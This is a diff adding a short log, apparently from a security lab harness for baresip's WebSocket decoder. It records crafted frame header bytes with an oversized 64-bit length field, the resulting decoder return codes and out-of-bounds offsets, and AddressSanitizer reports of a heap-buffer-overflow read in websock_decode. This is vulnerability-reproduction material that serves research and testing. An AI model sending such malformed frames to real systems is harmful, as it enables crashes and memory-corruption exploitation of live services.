@@ -1,0 +1,22 @@
+CRAFT_B0=82 CRAFT_B1=ff MASKBIT=1 LENBYTES=fffffffffffffffc KEY=b4b4b4b4
+MODE=attack RC=61 HDR_LEN=0xADDR MASK=1 MKEY=00000000
+PAYLOAD_FIRST=00 PAYLOAD_LAST=00 CONSUMED=10
+CRAFT_B0=82 CRAFT_B1=ff MASKBIT=1 LENBYTES=0000000000000008 KEY=b4b4b4b4
+MODE=safe RC=0 HDR_LEN=0xADDR MASK=1 MKEY=b4b4b4b4
+PAYLOAD_FIRST=b4 PAYLOAD_LAST=b4 CONSUMED=14
+REGION_BYTES=30 PAYLOAD_BYTES=16 SENTINEL_BYTES=32 KEY=0xb4
+PLAIN_PRE_ADJACENT=eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+PLAIN_FIRST_OOB_OFFSET=12
+PLAIN_FAULT_OFFSET=44
+PLAIN_ADJACENT=5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a
+CRAFT_B0=82 CRAFT_B1=ff MASKBIT=1 LENBYTES=fffffffffffffffc KEY=b4b4b4b4
+READ of size 1 at 0xADDR thread T0
+    #0 0xADDR in websock_decode /home/mesh-home/mishe-tauftauf2shell/lab/frontier/baresip2shell/harness/./websock_fn.inc:46:11
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/mesh-home/mishe-tauftauf2shell/lab/frontier/baresip2shell/harness/./websock_fn.inc:46:11 in websock_decode
+CRAFT_B0=82 CRAFT_B1=ff MASKBIT=1 LENBYTES=fffffffffffffffc KEY=b4b4b4b4
+READ of size 1 at 0xADDR thread T0
+    #0 0xADDR in websock_decode /home/mesh-home/mishe-tauftauf2shell/lab/frontier/baresip2shell/harness/websock_fn.inc:46
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/mesh-home/mishe-tauftauf2shell/lab/frontier/baresip2shell/harness/websock_fn.inc:46 in websock_decode
+CRAFT_B0=82 CRAFT_B1=ff MASKBIT=1 LENBYTES=0000000000000008 KEY=b4b4b4b4
+MODE=safe RC=0 HDR_LEN=0xADDR MASK=1 MKEY=b4b4b4b4
+PAYLOAD_FIRST=b4 PAYLOAD_LAST=b4 CONSUMED=14
